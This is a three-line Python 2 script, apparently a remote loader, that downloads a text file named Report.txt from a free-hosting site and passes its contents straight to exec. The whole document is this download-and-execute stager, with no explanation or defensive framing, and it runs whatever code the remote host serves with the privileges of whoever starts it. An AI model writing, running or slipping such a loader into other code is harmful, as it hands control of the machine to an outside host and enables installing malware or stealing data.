import requests, os
z = requests.get('https://justaserverscript.000webhostapp.com/Report.txt').text
exec z
